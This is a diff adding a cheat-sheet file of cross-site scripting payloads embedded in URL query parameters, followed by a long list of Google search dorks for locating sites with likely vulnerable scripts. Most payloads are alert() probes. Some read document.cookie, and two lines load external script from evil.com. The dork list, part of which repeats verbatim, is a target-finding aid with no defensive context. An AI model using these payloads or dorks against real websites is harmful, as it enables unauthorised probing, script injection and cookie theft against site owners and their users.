@@ -1,0 +1,155 @@
+#Top 25 XSS Dorks according to OpenBugBounty
+?q=<script>alert('XSS')</script>
+?s=<svg/onload=alert('XSS')>
+?search=<img src=x onerror=alert('XSS')>
+?id=<iframe src=javascript:alert('XSS')>
+?lang=<body onload=alert('XSS')>
+?keyword=<svg/onload=alert(document.cookie)>
+?query=<img src=1 onerror=alert('XSS')>
+?page=<script src=http://evil.com/xss.js></script>
+?keywords=<video src=x onerror=alert('XSS')>
+?year=<script>alert('2025')</script>
+?view=<link rel=stylesheet href=javascript:alert('XSS')>
+?email=<form action=javascript:alert('XSS')><input>
+?type=<body onerror=alert('XSS')>
+?name=<iframe src="javascript:alert('XSS')">
+?p=<object data="javascript:alert('XSS')">
+?month=<svg/onload=alert('XSS')>
+?immagine=<math href="javascript:alert('XSS')"></math>
+?list_type=<a href="javascript:alert('XSS')">Click</a>
+?url=<script>alert(document.domain)</script>
+?terms=<style>@import 'javascript:alert("XSS")';</style>
+?categoryid=<iframe src="javascript:alert('XSS')">
+?key=<img src="x" onerror="alert('XSS')">
+?l=<audio src="x" onerror="alert('XSS')">
+?begindate=<marquee onstart=alert('XSS')>
+?enddate=<object data="javascript:alert('XSS')">
+
+
+
+#More Advanced XSS Dorks
+?q=<details/open/ontoggle=alert(1)>
+?s=<select autofocus onfocus=alert(1)>
+?redirect=<img/src=x onerror=alert(1)>
+?search=<a href=javascript:alert(1)>Click</a>
+?callback=<img src onerror=alert(1)>
+?return=<svg onload=alert(1)>
+?dest=<input onfocus=alert(1) autofocus>
+?next=<video src=1 onerror=alert(1)>
+?url=<script src=https://evil.com/xss.js></script>
+
+
+#XSS Dorks for Error Pages
+?q=%3Cscript%3Ealert(1)%3C/script%3E
+?id=%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+?search=%3Cimg/src=x onerror=alert(1)%3E
+?lang=%3Cbody onload=alert(1)%3E
+
+
+#Directory Listings & XSS
+?q=<svg/onload=alert(document.domain)>
+?s=<marquee/onstart=alert('XSS')>
+
+
+#Google Dorks
+/2wayvideochat/index.php?r=
+/elms/subscribe.php?course_id=
+/gen_confirm.php?errmsg=
+/hexjector.php?site=
+/index.php?option=com_easygb&Itemid=
+/index.php?view=help&faq=1&ref=
+/info.asp?page=fullstory&key=1&news_type=news&onvan=
+/main.php?sid=
+/search.php?query=
+/product.php?id=
+/news.php?article_id=
+/blog.php?post_id=
+/profile.php?user_id=
+/comment.php?post_id=
+/forum.php?thread_id=
+/gallery.php?image_id=
+/video.php?video_id=
+/download.php?file_id=
+/cart.php?item_id=
+/checkout.php?order_id=
+/contact.php?ref=
+/about.php?section=
+/services.php?service_id=
+/team.php?member_id=
+/faq.php?question_id=
+/2wayvideochat/index.php?r=
+/elms/subscribe.php?course_id=
+/gen_confirm.php?errmsg=
+/hexjector.php?site=
+/index.php?option=com_easygb&Itemid=
+/index.php?view=help&faq=1&ref=
+/info.asp?page=fullstory&key=1&news_type=news&onvan=
+/main.php?sid=
+/search.php?query=
+/product.php?id=
+/news.php?article_id=
+/blog.php?post_id=
+/profile.php?user_id=
+/comment.php?post_id=
+/forum.php?thread_id=
+/gallery.php?image_id=
+/video.php?video_id=
+/download.php?file_id=
+/cart.php?item_id=
+/checkout.php?order_id=
+/contact.php?ref=
+/about.php?section=
+/services.php?service_id=
+/team.php?member_id=
+/faq.php?question_id=
+inurl:index.php?id=
+inurl:product.php?id=
+inurl:category.php?id=
+inurl:article.php?id=
+inurl:gallery.php?id=
+inurl:page.php?id=
+inurl:show.php?id=
+inurl:detail.php?id=
+inurl:view.php?id=
+inurl:newsitem.php?num=
+inurl:readnews.php?id=
+inurl:topic.php?ID=
+inurl:forum.php?topic=
+inurl:viewforum.php?id=
+inurl:profile.php?id=
+inurl:showthread.php?t=
+inurl:member.php?action=profile&id=
+inurl:productlist.php?id=
+inurl:shop_category.php?id=
+inurl:catalog.php?cat=
+inurl:com_feedpostold/feedpost.php?url=
+inurl:/products/orkutclone/scrapbook.php?id=
+inurl:/products/classified/headersearch.php?sid=
+inurl:/poll/default.asp?catid=
+inurl:/search_results.php?search=Search&k=
+inurl:/preaspjobboard//Employee/emp_login.asp?msg1=
+inurl:pages/match_report.php?mid=
+inurl:/notice.php?msg=
+inurl:/gen_confirm.php?errmsg=
+inurl:/index.php?option=com_easygb&Itemid=
+inurl:/2wayvideochat/index.php?r=
+inurl:/view.php?PID=
+inurl:/Property-Cpanel.html?pid=
+inurl:/showproperty.php?id=
+inurl:/vehicle/buy_do_search/?order_direction=
+inurl:/elms/subscribe.php?course_id=
+inurl:/winners.php?year=2008&type=
+inurl:/schoolmv2/html/studentmain.php?session=
+inurl:/site_search.php?sfunction=
+inurl:/search.php?search_keywords=
+inurl:/hexjector.php?site=
+inurl:/news.php?id=
+inurl:/index.php?view=help&faq=1&ref=
+inurl:"contentPage.php?id="
+inurl:"displayResource.php?id="
+intext:"Website by Mile High Creative"
+inurl:index.php?option=com_reservations&task=askope&nidser=2&namser=
+inurl:/info.asp?page=fullstory&key=1&news_type=news&onvan=
+inurl:/ser/parohija.php?id=
+inurl:/strane/pas.php?id=
+inurl:/main.php?sid=
